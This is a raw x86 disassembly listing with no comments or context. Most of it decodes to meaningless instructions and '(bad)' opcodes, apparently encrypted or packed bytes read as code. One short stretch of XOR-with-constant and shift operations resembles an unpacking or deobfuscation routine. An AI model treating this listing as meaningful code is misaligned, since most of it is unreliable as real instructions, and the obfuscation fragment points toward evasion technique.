  41828a:	mov    al,0x5d
  41828c:	fs adc al,0xc5
  41828f:	xlat   BYTE PTR ds:[ebx]
  418290:	mov    eax,0xf70518bb
  418295:	mov    bh,BYTE PTR [eax]
  418297:	sub    DWORD PTR [esi+0x2be412e5],esp
  41829d:	mov    ecx,0x10c76b41
  4182a2:	nop
  4182a3:	xchg   esp,eax
  4182a4:	pop    eax
  4182a5:	jns    0x5c488fa3
  4182ab:	int3   
  4182ac:	push   ebp
  4182ad:	mov    ch,0xf7
  4182af:	sbb    al,0x48
  4182b1:	mov    BYTE PTR [edx-0x6],cl
  4182b4:	shr    BYTE PTR [esi],0xc6
  4182b7:	inc    ecx
  4182b8:	jmp    0x418339
  4182ba:	cli    
  4182bb:	adc    BYTE PTR [edi],al
  4182bd:	pop    esi
  4182be:	sbb    BYTE PTR [ebx+0x69],ch
  4182c1:	and    ebp,DWORD PTR [edi+0x174d2df5]
  4182c7:	addr16 xor ebp,ecx
  4182ca:	push   edi
  4182cb:	fstp   QWORD PTR [ebx]
  4182cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182ce:	push   ecx
  4182cf:	test   BYTE PTR [edx+0x12],cl
  4182d2:	enter  0x858c,0x48
  4182d6:	inc    esp
  4182d7:	loop   0x418305
  4182d9:	or     ebp,DWORD PTR [edi+eax*2+0xefd08a6]
  4182e0:	pop    edx
  4182e1:	or     eax,0x15af5578
  4182e6:	add    al,0xb6
  4182e8:	pop    ss
  4182e9:	outs   dx,BYTE PTR ds:[esi]
  4182ea:	sub    ebx,DWORD PTR [eax+ebx*4-0x30709dc6]
  4182f1:	int3   
  4182f2:	imul   BYTE PTR [esi]
  4182f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182f5:	es xchg esi,eax
  4182f7:	ds inc ebx
  4182f9:	daa    
  4182fa:	add    DWORD PTR [ecx],edx
  4182fc:	pop    ebx
  4182fd:	stc    
  4182fe:	xor    al,0xc5
  418300:	cld    
  418301:	je     0x418285
  418303:	jne    0x4182c5
  418305:	dec    esi
  418306:	outs   dx,BYTE PTR ds:[esi]
  418307:	jle    0x41836f
  418309:	sar    DWORD PTR [eax+0x1c9f6b54],cl
  41830f:	adc    ebx,DWORD PTR [eax+0x13]
  418312:	nop    esi
  418315:	add    eax,0xd9dcf283
  41831a:	jp     0x418325
  41831c:	dec    edx
  41831d:	loop   0x4182fe
  41831f:	call   0x21dd90b7
  418324:	in     eax,dx
  418325:	and    eax,0xcee522ee
  41832a:	retf   0xf497
  41832d:	push   ecx
  41832e:	retf   
  41832f:	enter  0x8b9c,0x76
  418333:	sbb    esi,ecx
  418335:	cdq    
  418336:	sbb    al,0xb7
  418338:	popf   
  418339:	ins    DWORD PTR es:[edi],dx
  41833a:	xor    ebp,DWORD PTR [edi+0x2db16209]
  418340:	lods   eax,DWORD PTR ds:[esi]
  418341:	mov    ecx,0x9de99b46
  418346:	dec    esp
  418347:	mov    gs,ecx
  418349:	int3   
  41834a:	and    eax,0xb1a44a75
  41834f:	jae    0x418335
  418351:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418352:	sub    BYTE PTR [edi+0x662a3aa6],ah
  418358:	sub    al,dh
  41835a:	mov    bh,dh
  41835c:	cwde   
  41835d:	jge    0x4183a6
  41835f:	dec    edi
  418360:	push   eax
  418361:	jb     0x418311
  418363:	pop    eax
  418364:	and    DWORD PTR [ebp+esi*1-0x5e713fe],0x15
  41836c:	jmp    0x575d:0xc0e3a278
  418373:	shl    BYTE PTR [edi+0x72],cl
  418376:	daa    
  418377:	or     ah,bl
  418379:	imul   edi,DWORD PTR [esi],0xc4213b59
  41837f:	mov    al,ds:0xa16a0951
  418384:	nop
  418385:	jbe    0x4183b4
  418387:	mov    ch,0xd4
  418389:	sahf   
  41838a:	inc    eax
  41838b:	mov    dl,0x98
  41838d:	sub    BYTE PTR [edx],bh
  41838f:	std    
  418390:	stc    
  418391:	mov    ds:0xc68b1f64,eax
  418396:	push   edx
  418397:	lea    esp,[ecx-0x5]
  41839a:	scas   eax,DWORD PTR es:[edi]
  41839b:	push   0xa2897180
  4183a0:	fcomp  DWORD PTR [eax]
  4183a2:	pushf  
  4183a3:	jecxz  0x4183a3
  4183a5:	outs   dx,BYTE PTR ds:[esi]
  4183a6:	ins    DWORD PTR es:[edi],dx
  4183a7:	adc    ah,al
  4183a9:	mov    DWORD PTR [ebp-0x4e],esi
  4183ac:	pop    ds
  4183ad:	fwait
  4183ae:	std    
  4183af:	enter  0x1e4c,0x6b
  4183b3:	shr    BYTE PTR [ebp-0x4],cl
  4183b6:	dec    edi
  4183b7:	push   es
  4183b8:	push   ds
  4183b9:	stos   BYTE PTR es:[edi],al
  4183ba:	cmp    bl,BYTE PTR [edx+0x4b3d6565]
  4183c0:	pop    edx
  4183c1:	lahf   
  4183c2:	xor    dl,dh
  4183c4:	xor    DWORD PTR [esi+0x4d76c5af],ebx
  4183ca:	inc    esp
  4183cb:	pop    esi
  4183cc:	out    dx,al
  4183cd:	ds scas eax,DWORD PTR es:[edi]
  4183cf:	leave  
  4183d0:	mov    ds:0xe5b642fc,al
  4183d5:	adc    DWORD PTR [ebp+ecx*8-0x2f3991a2],eax
  4183dc:	mov    esp,DWORD PTR [edx+edi*4]
  4183df:	test   eax,0x49fb2722
  4183e4:	ja     0x41845b
  4183e6:	sbb    BYTE PTR gs:[edx+0x31],al
  4183ea:	loope  0x41842f
  4183ec:	shl    DWORD PTR [ecx+0x4],0x9e
  4183f0:	dec    esi
  4183f1:	sar    bh,cl
  4183f3:	out    0x16,al
  4183f5:	push   esp
  4183f6:	scas   al,BYTE PTR es:[edi]
  4183f7:	jmp    0x418449
  4183f9:	xlat   BYTE PTR ds:[ebx]
  4183fa:	xor    al,BYTE PTR [esp+ecx*8+0x32eb261d]
  418401:	and    BYTE PTR [edx-0x46],0x4b
  418405:	jne    0x418452
  418407:	jns    0x418409
  418409:	loope  0x4183f3
  41840b:	retf   
  41840c:	pop    es
  41840d:	fcom   QWORD PTR [eax+0x3f]
  418410:	mov    cl,0x32
  418412:	push   ecx
  418413:	jecxz  0x41842d
  418415:	dec    esi
  418416:	sti    
  418417:	ror    bl,0xa
  41841a:	leave  
  41841b:	(bad)  
  41841c:	xor    BYTE PTR [edx+0x24],cl
  41841f:	push   es
  418420:	mov    bh,0x1e
  418422:	sub    BYTE PTR [eax-0x25],dh
  418425:	jb     0x4183bb
  418427:	mov    ebp,0xe10efb57
  41842c:	xor    DWORD PTR [edx-0x21c9fc11],eax
  418432:	leave  
  418433:	pop    edx
  418434:	dec    ebp
  418435:	push   ebx
  418436:	loop   0x4183f8
  418438:	ret    
  418439:	xor    eax,0xfa90f5bb
  41843e:	mov    ch,0x6e
  418440:	nop
  418441:	stos   BYTE PTR es:[edi],al
  418442:	pusha  
  418443:	stos   BYTE PTR es:[edi],al
  418444:	push   ss
  418445:	cmp    eax,ebp
  418447:	mov    dl,0xc9
  418449:	sbb    eax,0x86f64cff
  41844e:	pop    ebx
  41844f:	add    BYTE PTR [edi],bh
  418451:	cmp    dl,BYTE PTR [edi]
  418453:	adc    eax,0x63437ca9
  418458:	dec    eax
  418459:	cmp    eax,0x8ef7361b
  41845e:	iret   
  41845f:	jl     0x418481
  418461:	jne    0x4183ff
  418463:	cmp    al,0x2e
  418465:	ret    
  418466:	dec    edi
  418467:	jge    0x41849a
  418469:	(bad)  
  41846a:	xor    ebp,esi
  41846c:	sbb    DWORD PTR [eax],eax
  41846e:	push   ss
  41846f:	mov    edx,esp
  418471:	(bad)  
  418472:	popf   
  418473:	xor    ebp,DWORD PTR [ecx+eax*8-0xa]
  418477:	pop    ebp
  418478:	test   DWORD PTR [esi-0x6761cad5],esi
  41847e:	pushf  
  41847f:	cmp    eax,0x21cea63a
  418484:	xchg   esi,eax
  418485:	pushf  
  418486:	inc    esi
  418487:	push   edi
  418488:	fimul  DWORD PTR [ebx+edx*1]
  41848b:	push   esp
  41848c:	or     ebp,DWORD PTR [eax+0x64]
  41848f:	push   ss
  418490:	sub    eax,0xd2f69c8a
  418495:	pop    ebp
  418496:	enter  0x4944,0xd1
  41849a:	out    0x23,eax
  41849c:	xor    BYTE PTR [edi],bh
  41849e:	test   eax,0x68da359
  4184a3:	jo     0x41851f
  4184a5:	aam    0x98
  4184a7:	inc    esp
  4184a8:	and    al,0x57
  4184aa:	xor    edx,DWORD PTR [eax-0x1cfa907b]
  4184b0:	popf   
  4184b1:	dec    esp
  4184b2:	(bad)  
  4184b3:	call   0x703c9274
  4184b8:	sub    ebp,edx
  4184ba:	sub    eax,0xcf6131c7
  4184bf:	int3   
  4184c0:	push   ecx
  4184c1:	(bad)  
  4184c2:	mov    dl,0xf5
  4184c4:	aam    0xac
  4184c6:	pop    esi
  4184c7:	push   cs
  4184c8:	mov    ecx,0xfc03886b
  4184cd:	mov    ebx,0x79a70a9e
  4184d2:	add    al,0x73
  4184d4:	and    BYTE PTR [eax],0xe5
  4184d7:	pop    edx
  4184d8:	inc    esi
  4184d9:	jne    0x41853f
  4184db:	sbb    DWORD PTR [ecx+ebp*4+0x74529e62],ebp
  4184e2:	adc    ebx,DWORD PTR [edi]
  4184e4:	jmp    0x2a55ce5f
  4184e9:	fistp  WORD PTR [eax]
  4184eb:	mov    esi,0xa774879b
  4184f0:	sbb    esp,DWORD PTR ds:[ebx-0x51]
  4184f4:	std    
  4184f5:	in     eax,0x10
  4184f7:	sbb    BYTE PTR [ebp+ecx*4-0x9fcf30],al
  4184fe:	pop    ebx
  4184ff:	jge    0x418577
  418501:	jmp    0x41849f
  418503:	daa    
  418504:	call   0xec2db280
  418509:	push   cs
  41850a:	pop    es
  41850b:	ficom  WORD PTR [ecx-0x6e649ef5]
  418511:	ds mov al,0xc4
  418514:	fcomip st,st(2)
  418516:	add    ebx,DWORD PTR [ebx]
  418518:	push   eax
  418519:	popa   
  41851a:	xchg   ebp,eax
  41851b:	mov    eax,ds:0x55c9e489
  418520:	mov    ds:0xbb59bef3,eax
  418525:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418526:	shr    DWORD PTR [eax-0x5f084d6c],cl
  41852c:	dec    esp
  41852d:	fs das 
  41852f:	mov    ecx,eax
  418531:	or     ecx,DWORD PTR [ebp+0x10]
  418534:	xor    eax,eax
  418536:	or     edx,eax
  418538:	xor    ecx,0xba699573
  41853e:	xor    edx,0x9c0a89d8
  418544:	mov    DWORD PTR [esi],ecx
  418546:	mov    DWORD PTR [esi+0x4],edx
  418549:	mov    eax,0xc0000000
  41854e:	mov    ecx,DWORD PTR [esi]
  418550:	mov    edx,DWORD PTR [esi+0x4]
  418553:	mov    edx,ecx
  418555:	shl    edx,0x1e
  418558:	xor    edx,eax
  41855a:	mov    DWORD PTR [ebp+0x14],edx
  41855d:	mov    edx,DWORD PTR [esi]
  41855f:	mov    edi,DWORD PTR [esi+0x4]
  418562:	xor    edi,0x9c0a89d8
  418568:	xor    edx,0xba699573
  41856e:	shrd   edx,edi,0x2
  418572:	shr    edi,0x2
  418575:	or     edi,DWORD PTR [ebp+0x14]
  418578:	xor    ecx,ecx
  41857a:	mov    DWORD PTR [ebp+0xc],edi
  41857d:	or     edx,ecx
  41857f:	mov    ecx,DWORD PTR [ebx]
  418581:	mov    edi,DWORD PTR [ebx+0x4]
  418584:	mov    edi,ecx
  418586:	shl    edi,0x1e
  418589:	xor    edi,eax
  41858b:	mov    eax,DWORD PTR [ebx]
  41858d:	mov    DWORD PTR [ebp+0x14],edi
  418590:	mov    edi,DWORD PTR [ebx+0x4]
  418593:	jmp    0x418b1d
  418598:	test   DWORD PTR [ebx+0x38127d46],0xa0bf58ac
  4185a2:	mov    edx,0x94f07dae
  4185a7:	mov    dl,0x68
  4185a9:	outs   dx,DWORD PTR ds:[esi]
  4185aa:	or     al,0x16
  4185ac:	cmp    eax,0xa0161604
  4185b1:	jo     0x41859d
  4185b3:	(bad)  
  4185b5:	stc    
  4185b6:	mov    BYTE PTR [ebx],ah
  4185b8:	push   es
  4185b9:	cmp    BYTE PTR [edx+0x3aaed736],bh
  4185bf:	je     0x4185a3
  4185c1:	sbb    al,0x1a
  4185c3:	repnz add al,0xc1
  4185c6:	stc    
  4185c7:	xor    ch,ch
  4185c9:	lock pop ebx
  4185cb:	xor    BYTE PTR [ecx+0x7fdfc5ca],0xb7
  4185d2:	stos   BYTE PTR es:[edi],al
  4185d3:	ret    0x2b3
  4185d6:	mov    ecx,DWORD PTR [esi-0x57]
  4185d9:	(bad)  
  4185da:	cmp    esi,DWORD PTR [edi]
  4185dc:	test   al,0xc9
  4185de:	add    al,0xdb
  4185e0:	stos   BYTE PTR es:[edi],al
  4185e1:	es sub ah,dh
  4185e4:	dec    esp
  4185e5:	pusha  
  4185e6:	es push 0x75
  4185e9:	adc    BYTE PTR [esi+eiz*1-0x55ae91eb],dl
  4185f0:	jle    0x4185e3
  4185f2:	push   cs
  4185f3:	daa    
  4185f4:	add    DWORD PTR [esi-0x12],ebx
  4185f7:	or     ebp,DWORD PTR [eax]
  4185f9:	add    esi,DWORD PTR [eax]
  4185fb:	inc    esi
  4185fc:	jl     0x41860c
  4185fe:	pop    ss
  4185ff:	arpl   sp,dx
  418601:	jne    0x41858f
  418603:	das    
  418604:	(bad)  
  418605:	nop
  418606:	sbb    ecx,DWORD PTR [ebx+0x51]
  418609:	out    dx,al
  41860a:	es cmp al,0xbb
  41860d:	mov    dh,0x5e
  41860f:	rcl    ebp,0xd2
  418612:	(bad)  
  418613:	mov    dh,0x53
  418615:	push   eax
  418616:	sbb    eax,0x9602912b
  41861b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41861c:	push   ecx
  41861d:	cli    
  41861e:	repz dec ebx
  418620:	retf   0xff7a
  418623:	int    0x35
  418625:	xor    eax,ebp
  418627:	add    BYTE PTR [eiz*1+0x1da726b5],bl
  41862e:	fsub   QWORD PTR [ecx+0xb936e64]
  418634:	pop    edi
  418635:	call   0xa9ee:0xb9600735
  41863c:	push   eax
  41863d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41863e:	imul   edi,eax,0x79
  418641:	shl    DWORD PTR [edx+0x6d],1
  418644:	cmp    BYTE PTR ds:0x21b7821f,cl
  41864a:	shl    ebx,1
  41864c:	fild   QWORD PTR [edx+0x6e]
  41864f:	call   0xd899:0x2c097f0b
  418656:	out    dx,al
  418657:	mov    esi,ecx
  418659:	rol    DWORD PTR [eax-0xe],0x1c
  41865d:	repnz fidiv WORD PTR [ebp-0x61]
  418661:	fs sub bl,cl
  418664:	sub    dh,BYTE PTR [ebp+0x4e5fc66c]
  41866a:	test   BYTE PTR [esi+eiz*1],0x11
  41866e:	shl    DWORD PTR [eax+0x26],1
  418671:	shr    DWORD PTR [ebx-0x70236815],0xa4
  418678:	icebp  
  418679:	imul   edx,ebx,0x67
  41867c:	push   ebx
  41867d:	or     edx,eax
  41867f:	jecxz  0x41867d
  418681:	and    edi,eax
  418683:	cmc    
  418684:	aam    0x8b
  418686:	(bad)  
  418687:	mov    esi,0x33d09832
  41868c:	inc    esi
  41868d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41868e:	ss push esi
  418690:	retf   0x8647
  418693:	dec    esp
  418694:	xchg   ebp,eax
  418695:	stc    
  418696:	cli    
  418697:	bound  eax,QWORD PTR [edx+0x1c5bab4c]
  41869d:	mov    ebx,DWORD PTR [edx+0x285cb1ec]
  4186a3:	lods   al,BYTE PTR ds:[esi]
  4186a4:	jecxz  0x418700
  4186a6:	fisubr WORD PTR [eax+0x49]
  4186a9:	int3   
  4186aa:	retf   0x180
  4186ad:	call   0x6b15:0x18b399df
  4186b4:	mov    eax,0x85139000
  4186b9:	sub    al,0x7d
  4186bb:	push   es
  4186bc:	shr    DWORD PTR [eax],0x86
  4186bf:	cmp    eax,esi
  4186c1:	cmc    
  4186c2:	inc    edx
  4186c3:	jb     0x418712
  4186c5:	shl    DWORD PTR [ecx+0x5a],0x96
  4186c9:	push   ds
  4186ca:	pusha  
  4186cb:	jns    0x41872e
  4186cd:	push   ecx
  4186ce:	jo     0x4186f1
  4186d0:	xchg   edi,eax
  4186d1:	pop    edi
  4186d2:	jne    0x418746
  4186d4:	(bad)  
  4186d6:	(bad)  
  4186d9:	(bad)  
  4186da:	scas   al,BYTE PTR es:[edi]
  4186db:	add    eax,edx
  4186dd:	dec    edx
  4186de:	lahf   
  4186df:	mov    esi,0xbb51ca7f
  4186e4:	sbb    DWORD PTR [esi],esi
  4186e6:	and    ebp,DWORD PTR [ebx+eax*4-0x2093c2d4]
  4186ed:	cdq    
  4186ee:	(bad)  
  4186ef:	(bad)  
  4186f0:	ins    DWORD PTR es:[edi],dx
  4186f1:	hlt    
  4186f2:	fsubrp st(4),st
  4186f4:	rol    BYTE PTR [edi],cl
  4186f6:	in     eax,dx
  4186f7:	pop    esp
  4186f8:	jae    0x418694
  4186fa:	add    eax,0x2d6944f6
  4186ff:	cmp    DWORD PTR [esp+eax*1+0x320e82ab],eax
  418706:	mov    ?,WORD PTR [ebp+0x14d32dd5]
  41870c:	stos   DWORD PTR es:[edi],eax
  41870d:	dec    edx
  41870e:	mov    ebx,0x5f346bf3
  418713:	pop    ebx
  418714:	sub    DWORD PTR [ebx+0x45],eax
  418717:	push   ebp
  418718:	mov    al,ds:0xadac11fa
  41871d:	and    bh,bl
  41871f:	or     eax,ebx
  418721:	pop    ebx
  418722:	data16 int3 
  418724:	mov    al,0x89
  418726:	jne    0x4186bd
  418728:	daa    
  418729:	mov    bl,0xae
  41872b:	ins    BYTE PTR es:[edi],dx
  41872c:	xchg   ecx,eax
  41872d:	adc    DWORD PTR [ecx],edi
  41872f:	sub    DWORD PTR [ecx+eax*8],eax
  418732:	pop    ss
  418733:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418734:	sub    BYTE PTR [edx],bh
  418736:	pop    esi
  418737:	ins    DWORD PTR es:[edi],dx
  418738:	ins    BYTE PTR es:[edi],dx
  418739:	data16 jo 0x4186f5
  41873c:	int    0x12
  41873e:	(bad)  
  41873f:	mov    ds:0x9dd04451,al
  418744:	sub    dl,dh
  418746:	imul   ecx,DWORD PTR [ebx+0x4eec7cd2],0xffffff80
  41874d:	sbb    al,0xcd
  41874f:	mov    edi,0x46bb7708
  418754:	out    dx,al
  418755:	sahf   
  418756:	cld    
  418757:	and    ebx,DWORD PTR [eax-0x56a7163]
  41875d:	push   ebx
  41875e:	xor    eax,0x438f7819
  418763:	pop    esp
  418764:	(bad)  
  418765:	pop    ds
  418766:	xor    BYTE PTR [edx-0x2f271eef],dh
  41876c:	test   DWORD PTR [eax+0x21],ecx
  41876f:	push   ecx
  418770:	and    al,0x8e
  418772:	adc    cl,BYTE PTR [eax-0x4adfc9e1]
  418778:	xor    eax,0x40072d02
  41877d:	add    BYTE PTR [ebx+0x6],dl
  418780:	xchg   ch,dl
  418782:	stc    
  418783:	scas   eax,DWORD PTR es:[edi]
  418784:	retf   
  418785:	daa    
  418786:	mov    esp,0x36457b6e
  41878b:	(bad)
  41878f:	call   0xe5a9:0x865e0e84
  418796:	pop    esp
  418797:	xor    DWORD PTR [ecx+0x215bb9b6],edi
  41879d:	and    esi,ebp
  41879f:	cmp    al,0xc6
  4187a1:	mov    DWORD PTR [esi-0x2b69e2c2],edi
  4187a7:	add    al,0xea
  4187a9:	pusha  
  4187aa:	iret   
  4187ab:	mov    ebx,0x43bac802
  4187b0:	stos   DWORD PTR es:[edi],eax
  4187b1:	sub    edx,esp
  4187b3:	icebp  
  4187b4:	jp     0x418778
  4187b6:	cmp    DWORD PTR [ebp+0x58],edi
  4187b9:	in     al,0xc1
  4187bb:	mov    ds:0xf043cc05,eax
  4187c0:	cs xor eax,0x41acb7a7
  4187c6:	in     eax,0x3
  4187c8:	jmp    0x4187a8
  4187ca:	ja     0x41884b
  4187cc:	sub    al,0x7f
  4187ce:	clc    
  4187cf:	xor    edx,ecx
  4187d1:	fwait
  4187d2:	dec    eax
  4187d3:	pop    es
  4187d4:	and    DWORD PTR [edi+0x25408b2c],esp
  4187da:	fwait
  4187db:	xor    al,0xca
  4187dd:	(bad)  
  4187de:	call   0x6c0d:0x98b56e65
  4187e5:	pusha  
  4187e6:	outs   dx,DWORD PTR ds:[esi]
  4187e7:	lods   al,BYTE PTR ds:[esi]
  4187e8:	jecxz  0x41880a
  4187ea:	push   ebx
  4187eb:	scas   eax,DWORD PTR es:[edi]
  4187ec:	popa   
  4187ed:	dec    edx
  4187ee:	pop    ecx
  4187ef:	dec    ebx
  4187f0:	ds xor eax,0xbbbcd587
  4187f6:	jns    0x418876
  4187f8:	cmp    dh,dh
  4187fa:	jmp    0x41883e
  4187fc:	xchg   edi,eax
  4187fd:	inc    esi
  4187fe:	aas    
  4187ff:	(bad)
  418803:	mov    DWORD PTR [esi+0x611cd58b],ebp
  418809:	mov    bh,0xbd
  41880b:	sbb    al,0x5c
  41880d:	push   esi
  41880e:	mov    dl,0x23
  418810:	mov    ch,0x90
  418812:	hlt    
  418813:	jns    0x4187fe
  418815:	pop    esi
  418816:	test   BYTE PTR [esi-0x2ae0514b],bh
  41881c:	hlt    
  41881d:	sub    cl,BYTE PTR [eax+ebp*2]
  418820:	into   
  418821:	sbb    al,0x9c
  418823:	add    DWORD PTR [edi+0x3c],eax
  418826:	xchg   esp,ebx
  418828:	pop    edi
  418829:	mov    al,ds:0xffbf55f4
  41882e:	scas   al,BYTE PTR es:[edi]
  41882f:	call   0x3325d86
  418834:	popa   
  418835:	repnz sbb eax,0x1bc14dab
  41883b:	xchg   esi,eax
  41883c:	push   si
  41883e:	xor    esi,DWORD PTR [ebp+0x53129546]
  418844:	or     BYTE PTR [ebx-0x7bf79a3a],ah
  41884a:	push   0xffffff81
  41884c:	cli    
  41884d:	mov    WORD PTR [edi-0x43e68a55],fs
  418853:	adc    ebx,DWORD PTR [edx+ebp*8]
  418856:	jg     0x4188b3
  418858:	idiv   DWORD PTR [ebx-0x46]
  41885b:	dec    esp
  41885c:	cmp    BYTE PTR [ebp-0x76],dl
  41885f:	sti    
  418860:	in     eax,dx
  418861:	push   ebp
  418862:	lods   al,BYTE PTR ds:[esi]
  418863:	leave  
  418864:	jmp    0x2a2:0x9620444b
  41886b:	or     eax,ebx
  41886d:	data16 sbb BYTE PTR [ebx-0x485fb1d5],ch
  418874:	inc    eax
  418875:	jb     0x41881d
  418877:	imul   BYTE PTR [ebp-0x63e8b10a]
  41887d:	cdq    
  41887e:	rcl    eax,1
  418880:	push   ebp
  418881:	dec    esi
  418882:	mov    WORD PTR [ebx-0x7d],ss
  418885:	sbb    eax,0x7bbdc454
  41888a:	mov    ?,WORD PTR [edx]
  41888c:	xor    al,0x23
  41888e:	test   ebp,eax
  418890:	repnz and eax,0xcad50088
  418896:	fimul  DWORD PTR [ebx-0x4a]
  418899:	call   0xd3ed4da
  41889e:	cmp    al,0x0
  4188a0:	fdiv   DWORD PTR [edx]
  4188a2:	xchg   ecx,eax
  4188a3:	push   cs
  4188a4:	pusha  
  4188a5:	sbb    eax,0xd2adc1c4
  4188aa:	adc    bh,ah
  4188ac:	out    0x1f,al
  4188ae:	dec    ecx
  4188af:	in     eax,dx
  4188b0:	adc    eax,0xc666c4cf
  4188b5:	pop    es
  4188b6:	nop
  4188b7:	in     eax,dx
  4188b8:	push   ds
  4188b9:	jmp    0x7249:0x3ab0d251
  4188c0:	pop    edi
  4188c1:	ja     0x4188e2
  4188c3:	and    DWORD PTR [edi-0x52],esi
  4188c6:	sub    eax,0xf68c4136
  4188cb:	ins    DWORD PTR es:[edi],dx
  4188cc:	outs   dx,DWORD PTR ds:[esi]
  4188cd:	in     eax,dx
  4188ce:	aas    
  4188cf:	aad    0x85
  4188d1:	and    dl,BYTE PTR [edx+0x53]
  4188d4:	out    0xd4,eax
  4188d6:	jns    0x4188f8
  4188d8:	xor    bh,BYTE PTR [ebx+0x43]
  4188db:	pop    eax
  4188dc:	xchg   esp,eax
  4188dd:	dec    esi
  4188de:	pop    edi
  4188df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188e0:	mov    ebp,0x3f0922af
  4188e5:	test   BYTE PTR [esi],ch
  4188e7:	cmp    DWORD PTR [ebx],0x283088f2
  4188ed:	ror    ecx,cl
  4188ef:	je     0x418924
  4188f1:	mov    ebp,0x8cf49716
  4188f6:	ja     0x41891f
  4188f8:	pop    edx
  4188f9:	jp     0x4188cb
  4188fb:	test   dh,0x45
  4188fe:	jbe    0x4188cd
  418900:	retf   0x86f
  418903:	push   0x75
  418905:	dec    ecx
  418906:	mov    dl,bl
  418908:	mov    edx,0xad6a4da8
  41890d:	xchg   ebx,eax
  41890e:	jnp    0x418980
  418910:	fcom   QWORD PTR [edx+0x3c51a047]
  418916:	retf   0x951d
  418919:	lds    edi,FWORD PTR [edi-0x7f]
  41891c:	dec    ebx
  41891d:	daa    
  41891e:	xor    esp,DWORD PTR [edx+0x3ecccb30]
  418924:	fldln2 
  418926:	out    dx,eax
  418927:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418928:	pop    ds
  418929:	pop    esp
  41892a:	sahf   
  41892b:	xor    ebx,esi
  41892d:	aam    0xe3
  41892f:	sti    
  418930:	jle    0x4188bc
  418932:	stos   DWORD PTR es:[edi],eax
  418933:	and    BYTE PTR [ecx-0x3a],dh
  418936:	shl    dl,0xd5
  418939:	popf   
  41893a:	xchg   esp,eax
  41893b:	add    dl,BYTE PTR [ebp-0xa]
  41893e:	outs   dx,BYTE PTR ds:[esi]
  41893f:	idiv   DWORD PTR [ebx-0x4d4a601f]
  418945:	daa    
  418946:	mov    eax,ds:0x97ecd6ff
  41894b:	retf   0x46a
  41894e:	sub    al,0x3d
  418950:	jb     0x4188f8
  418952:	xlat   BYTE PTR ds:[ebx]
  418953:	std    
  418954:	neg    BYTE PTR [ebp+0x7d]
  418957:	fidiv  WORD PTR [ebx-0x5c]
  41895a:	cmp    DWORD PTR [edi+eiz*4+0x61ccf370],esp
  418961:	add    bh,BYTE PTR ds:0xa750d57a
  418967:	fimul  DWORD PTR [eax-0x44849239]
  41896d:	push   ds
  41896e:	dec    eax
  41896f:	xchg   BYTE PTR ds:0xc455029f,cl
  418975:	jge    0x418924
  418977:	pop    es
  418978:	imul   edx,eax,0xffffffbf
  41897b:	mov    edx,0x34803141
  418980:	(bad)  
  418981:	in     al,0x6c
  418983:	bnd jge 0x418a05
  418986:	inc    esi
  418987:	push   esi
  418988:	loop   0x4189c5
  41898a:	in     eax,dx
  41898b:	jnp    0x418965
  41898d:	xor    al,bh
  41898f:	mov    WORD PTR [ecx+0x49],fs
  418992:	mov    dh,0x82
  418994:	addr16 pop esi
  418996:	shl    esi,1
  418998:	scas   al,BYTE PTR es:[edi]
  418999:	lahf   
  41899a:	repnz dec ebx
  41899c:	ds clc 
  41899e:	xchg   ebx,eax
  41899f:	jle    0x4189bb
  4189a1:	mov    edi,0xdfa3420b
  4189a6:	push   es
  4189a7:	mov    esp,0x7233e66f
  4189ac:	nop
  4189ad:	cmp    eax,0x9a0d1e2
  4189b2:	lea    esp,[ecx-0x173b446f]
  4189b8:	pop    esp
  4189b9:	idiv   BYTE PTR [ecx+eax*2]
  4189bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189bd:	mov    eax,ds:0x3c27bbda
  4189c2:	jmp    0xdaa45536
  4189c7:	nop
  4189c8:	adc    esp,DWORD PTR [ebx+0x3e]
  4189cb:	push   edx
  4189cc:	mov    al,0x1f
  4189ce:	jno    0x41897b
  4189d0:	cdq    
  4189d1:	out    dx,al
  4189d2:	cmp    eax,DWORD PTR [edx-0x5d]
  4189d5:	xor    eax,0x8f9aed6e
  4189da:	aam    0xed
  4189dc:	mov    al,ds:0xd2f3f71e
  4189e1:	rcr    BYTE PTR [esi+0x64f823b6],cl
  4189e7:	add    DWORD PTR [eax],0x11
  4189ea:	lahf   
  4189eb:	xchg   edx,eax
  4189ec:	ss mov edx,esi
  4189ef:	fxtract 
  4189f1:	pusha  
  4189f2:	addr16 pop ebx
  4189f4:	xchg   esi,eax
  4189f5:	arpl   WORD PTR [edi],di
  4189f7:	fisttp WORD PTR es:0x83d9012f
  4189fe:	loopne 0x4189f1
  418a00:	in     al,dx
  418a01:	inc    edx
  418a02:	out    0x6f,al
  418a04:	daa    
  418a05:	adc    BYTE PTR [esi+ebp*2+0x74],al
  418a09:	xchg   edx,eax
  418a0a:	mov    eax,ds:0x419e2eef
  418a0f:	loope  0x4189ea
  418a11:	sar    bh,cl
  418a13:	lods   eax,DWORD PTR ds:[esi]
  418a14:	leave  
  418a15:	jbe    0x418a3b
  418a17:	pop    ecx
  418a18:	adc    al,0xc2
  418a1a:	and    DWORD PTR [edx-0x24],ebp
  418a1d:	fcmovnbe st,st(5)
  418a1f:	mov    dh,0x69
  418a21:	jns    0x418a27
  418a23:	sahf   
  418a24:	std    
  418a25:	push   esi
  418a26:	dec    esp
  418a27:	scas   al,BYTE PTR es:[edi]
  418a28:	sub    al,0x7c
  418a2a:	xchg   ecx,eax
  418a2b:	test   al,0x19
  418a2d:	ins    BYTE PTR es:[edi],dx
  418a2e:	nop
  418a2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a31:	bound  ebx,QWORD PTR [ecx-0xd]
  418a34:	stos   DWORD PTR es:[edi],eax
  418a35:	clc    
  418a36:	loop   0x418a29
  418a38:	sbb    bl,0x71
  418a3b:	sbb    BYTE PTR [esi],cl
  418a3d:	xor    al,BYTE PTR [ebp+0x3454ad2a]
  418a43:	push   ebx
  418a44:	inc    ebx
